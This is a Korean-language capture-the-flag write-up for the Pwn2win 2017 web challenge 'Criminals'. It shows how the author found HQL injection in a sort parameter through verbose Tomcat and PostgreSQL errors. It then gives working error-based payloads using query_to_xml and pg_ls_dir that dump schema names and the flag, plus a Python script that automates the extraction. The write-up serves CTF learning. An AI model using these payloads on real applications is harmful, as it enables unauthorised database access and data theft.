# [WEB] Pwn2win CTF 2017 - Criminals

# Description

>  Criminals
>
>  Hey, Rebellious member, let’s hack this Bloodsuckers web app. I think they keep some secret.
>
>  <http://200.136.213.109/>
>
>  Automated tools are NOT required and NOT allowed.
>
>  Id: criminals

# Analysis

페이지에 접속하면 간단한 범죄자 검색(?) 사이트가 나온다.

해당 사이트에서 범죄자의 이름, 나이 그리고 죄명으로 검색하며, Order 항목을 통해 정렬이 가능하다.

이름, 나이, 죄명에는 취약점이 발생안하였으나, order 부분에 에러를 유발하는 임의의 쿼리를 삽입하면 에러문구를 확인할 수 있다.

*  Query : name=&age=&crime=&order=--%23&submit=

```html
<!DOCTYPE html><html><head><title>Apache Tomcat/8.0.47 - Error report</title><style type="text/css">H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}.line {height: 1px; background-color: #525D76; border: none;}</style> </head><body><h1>HTTP Status 500 - Request processing failed; nested exception is java.lang.IllegalArgumentException: org.hibernate.QueryException: unexpected char: '#' [SELECT c from solutions.bloodsuckers.models.Criminal c WHERE (c.name like :pName or :pNameLength = 0) and (c.age = :pAge or :pAge = 0) and (c.crime like :pCrime or :pCrimeLength = 0) order by --#]</h1><div class="line"></div><p><b>type</b> Exception report</p><p><b>message</b> <u>Request processing failed; nested exception is java.lang.IllegalArgumentException: org.hibernate.QueryException: unexpected char: '#' [SELECT c from solutions.bloodsuckers.models.Criminal c WHERE (c.name like :pName or :pNameLength = 0) and (c.age = :pAge or :pAge = 0) and (c.crime like :pCrime or :pCrimeLength = 0) order by --#]</u></p><p><b>description</b> <u>The server encountered an internal error that prevented it from fulfilling this request.</u></p><p><b>exception</b></p><pre>org.springframework.web.util.NestedServletException: Request processing failed; nested exception is java.lang.IllegalArgumentException: org.hibernate.QueryException: unexpected char: '#' [SELECT c from solutions.bloodsuckers.models.Criminal c WHERE (c.name like :pName or :pNameLength = 0) and (c.age = :pAge or :pAge = 0) and (c.crime like :pCrime or :pCrimeLength = 0) order by --#]
	org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:973)
	org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:863)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:648)
	org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:837)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:729)
	org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
</pre><p><b>root cause</b></p><pre>java.lang.IllegalArgumentException: org.hibernate.QueryException: unexpected char: '#' [SELECT c from solutions.bloodsuckers.models.Criminal c WHERE (c.name like :pName or :pNameLength = 0) and (c.age = :pAge or :pAge = 0) and (c.crime like :pCrime or :pCrimeLength = 0) order by --#]
	org.hibernate.jpa.spi.AbstractEntityManagerImpl.convert(AbstractEntityManagerImpl.java:1750)
	org.hibernate.jpa.spi.AbstractEntityManagerImpl.convert(AbstractEntityManagerImpl.java:1677)

<!-- 중략 -->

</pre><p><b>root cause</b></p><pre>org.hibernate.QueryException: unexpected char: '#' [SELECT c from solutions.bloodsuckers.models.Criminal c WHERE (c.name like :pName or :pNameLength = 0) and (c.age = :pAge or :pAge = 0) and (c.crime like :pCrime or :pCrimeLength = 0) order by --#]
	org.hibernate.hql.internal.ast.QueryTranslatorImpl.doCompile(QueryTranslatorImpl.java:250)
	org.hibernate.hql.internal.ast.QueryTranslatorImpl.compile(QueryTranslatorImpl.java:158)
	org.hibernate.engine.query.spi.HQLQueryPlan.&lt;init&gt;(HQLQueryPlan.java:126)
	org.hibernate.engine.query.spi.HQLQueryPlan.&lt;init&gt;(HQLQueryPlan.java:88)
	org.hibernate.engine.query.spi.QueryPlanCache.getHQLQueryPlan(QueryPlanCache.java:190)

<!-- 이하 생략 -->
```

이 에러문구에서 우리는 2가지의 정보를 얻을 수 있다.

1. 쿼리문

SELECT c from solutions.bloodsuckers.models.Criminal c WHERE (c.name like :pName or :pNameLength = 0) and (c.age = :pAge or :pAge = 0) and (c.crime like :pCrime or :pCrimeLength = 0) order by --#

2. Hibernate

>  참고 : https://docs.jboss.org/hibernate/orm/3.3/reference/ko-KR/html/queryhql.html

쿼리문을 보면 order by 구문 뒤에 공격을 해야 할 것으로 예상되고, Hibernate는 native SQL로써 실제로 처리하는 Database는 따로 존재한다.

다른 에러를 통해 Database를 뭘 사용하는지 찾아보자.

*  Query : name=&age=&crime=&order=1||1&submit=

```html
org.postgresql.util.PSQLException: ERROR: operator does not exist: integer || integer
  Hint: No operator matches the given name and argument type(s). You might need to add explicit type casts.
```

오 PSQL임을 확인하였다.

즉 Hibernate를 통해 Postgre SQL이랑 통신을 하는 페이지이며, order by 구문으로 HQL Injection가 가능하다.

# Exploit

## HQL Injeciton

SQL처리 중 에러가 발생하면 500 Error와 함께 에러 로그를 출력해 준다.

Postgre SQL의 pg_ls_dir() 함수를 이용해 Error Based SQLi공격을 진행하기로 하였다.

*  Query : name=&age=&crime=&submit&order=array_upper(xpath ('row', query_to_xml ('select pg_ls_dir((SELECT column_name||chr(58)||table_name FROM information_schema.columns c limit 1 offset 0))', true,  false,'')),1)
*  Result : secret:flag

>  문제를 풀 때는 offset 0부터 50까지의 테이블과 컬럼을 추출하였다.

flag 테이블에 secret 컬럼이 존재하는 것을 확인하였으니, 이제 secret의 내용을 읽어보자.

*  Query : name=&age=&crime=&submit&order=array_upper(xpath('row',query_to_xml('select pg_ls_dir((SELECT secret from flag))',true,false,'')),1)
*  Result : CTF-BR{bl00dsuck3rs_HQL1njection_pwn2win}

플래그를 얻었다.

아래는 문제풀 때 사용한 코드이다.

```python
import urllib2
import urllib

url = "http://200.136.213.109/"

def r(param):
    global url
    try:
        req = urllib2.Request(url,param)
        res = urllib2.urlopen(req)
        return res.read()
    except urllib2.HTTPError, e:
        if e.getcode() == 500:
            return e.read()

def p(data):
    return data.split('PSQLException:')[1].split('&quot;')[1].split('&quot;')[0]

def main():
    # Extract table and column name
    #for i in range(0,30):
    #    print p(r("name=&age=&crime=&submit&order=array_upper(xpath ('row', query_to_xml ('select pg_ls_dir((SELECT column_name||chr(58)||table_name FROM information_schema.columns c limit 1 offset %d))', true,  false,'')),1)"%(i)))

    # Extract flag
    print p(r("name=&age=&crime=&submit&order=array_upper(xpath('row',query_to_xml('select pg_ls_dir((SELECT secret from flag))',true,false,'')),1)"))


if __name__=='__main__':
    main()
```



**CTF-BR{bl00dsuck3rs_HQL1njection_pwn2win}**

